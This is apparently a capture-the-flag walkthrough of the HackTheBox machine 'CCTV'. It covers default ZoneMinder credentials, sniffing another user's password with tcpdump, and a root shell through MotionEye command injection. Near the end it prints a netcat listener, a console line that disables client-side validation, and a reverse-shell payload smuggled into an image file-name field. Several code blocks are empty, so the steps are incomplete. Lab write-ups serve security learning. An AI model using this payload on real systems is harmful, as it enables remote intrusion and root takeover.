<p>In CCTV, we exploit a ZoneMinder SQL injection extracting user credentials, sniff traffic with tcpdump capturing another user’s password, and exploit MotionEye to achieve root via command injection.</p>

<h2>Introduction</h2>

<p>In this post, I will demonstrate the exploitation of an easy difficulty machine called "CCTV" on HackTheBox. Overall, it was an enjoyable box offering a nice learning experience.</p>

<p>This box was pwnd on the 1 April. The walkthrough was released when the machine retired on 13 July.</p>

<p>Upon visiting the website running on port 80, I was greeted with a generic page where a login button caught my eye immediately.</p>

<p>Upon clicking on the login button, I was redirected to a ZoneMinder login panel:</p>
<img src="/images/CCTV/cctv_zoneminder_login.webp" alt="ZoneMinder login panel" class="postImage">

<p>Here, I tried the default credentials of "admin" "admin" which gave us access to the ZoneMinder dashboard:</p>
<img src="/images/CCTV/cctv_ZoneMinder_dashboard.webp" alt="ZoneMinder login panel" class="postImage">

<p>From the dashboard, I found out that it was running ZoneMinder version 1.37.63. Doing a quick Google search, I found out that there was a boolean based SQL-injection in a function in the web/ajax/event.php file. Details of the vulnerability can be found here: <span class="url"><a href="https://github.com/ZoneMinder/zoneminder/security/advisories/GHSA-qm8h-3xvf-m7j3">Boolean based SQL-injection ZoneMinder</a></span></p>

<h2> Step 4: Lateral privilege escalation to sa_mark</h2>

<pre>

</pre>

<p>It seems that tcpdump has a capability set. This is interesting as tcpdump normally needs root privileges to operate as it works with raw network packets. However, the capability "cap_net_raw" is enabled which should allow our regular user "mark" to use it without root privileges. Putting things together, could it be that we can capture the credentials of the "sa_mark" user when sniffing when he periodically logs in to perform his commands? I gave it a try:</p>

<pre>
mark@cctv:~$ tcpdump -i any -w capture_output.pcap

</pre>

<p>After transferring the pcap file to my machine. I did indeed find the credentials of sa_mark after scrolling through the conversations in Wireshark:</p>

<img src="/images/CCTV/cctv_sa_mark_wireshark.webp" alt="Wireshark sa_mark password" class="postImage">

<p>This password can be used to login as the sa_mark user:</p>

<pre>

</pre>

<p>In the home directory, we can find the user.txt:</p>

<p>Some quick Google search revealed it was vulnerable to command injection: <span class="url"><a href="https://github.com/advisories/GHSA-j945-qm58-4gjx">MotionEye command injection</a></span></p>

<p>First, we start our listener on our kali VM:</p>
<pre>
┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9999            
listening on [any] 9999 ...
</pre>

<p>Next, we disable client side validation by pasting the following in the browser console:</p>
<pre>
configUiValid = function() { return true; };
</pre>

<p>Subsequently, we inject the reverse shell payload in the still images section of the camera and set the settings according to the image and hit apply:</p>
<img src="/images/CCTV/cctv_command_injection.webp" alt="command injection motioneye" class="postImage">

<p>I used this payload in the "Image File Name" field</p>

<pre>
$(bash -c "bash -i >& /dev/tcp/10.10.15.26/9999 0>&1").%Y-%m-%d-%H-%M-%S
</pre>

<p>After some time, a reverse shell spawned as root where we can get the root flag:</p>
